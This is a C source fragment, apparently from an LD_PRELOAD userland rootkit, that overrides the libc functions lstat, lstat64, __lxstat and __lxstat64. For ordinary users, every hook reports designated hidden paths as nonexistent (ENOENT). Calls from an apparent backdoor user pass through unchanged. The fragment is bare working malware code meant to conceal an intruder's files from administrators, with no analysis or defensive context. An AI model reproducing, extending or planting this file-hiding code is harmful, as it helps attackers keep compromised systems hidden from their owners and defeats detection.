int lstat(const char *pathname, struct stat *buf)
{
    hook(CLSTAT);
    if(is_bdusr()) return (long)call(CLSTAT, pathname, buf);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CLSTAT, pathname, buf);
}

int lstat64(const char *pathname, struct stat64 *buf)
{
    hook(CLSTAT64);
    if(is_bdusr()) return (long)call(CLSTAT64, pathname, buf);
    if(hidden_path64(pathname)) { errno=ENOENT; return -1; }
    return (long)call(CLSTAT64, pathname, buf);
}

int __lxstat(int version, const char *pathname, struct stat *buf)
{
    hook(C__LXSTAT);
    if(is_bdusr()) return (long)call(C__LXSTAT, version, pathname, buf);
    if(hidden_path(pathname) || hidden_lpath(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__LXSTAT, version, pathname, buf);
}

int __lxstat64(int version, const char *pathname, struct stat64 *buf)
{
    hook(C__LXSTAT64);
    if(is_bdusr()) return (long)call(C__LXSTAT64, version, pathname, buf);
    if(hidden_path64(pathname) || hidden_lpath64(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__LXSTAT64, version, pathname, buf);
}
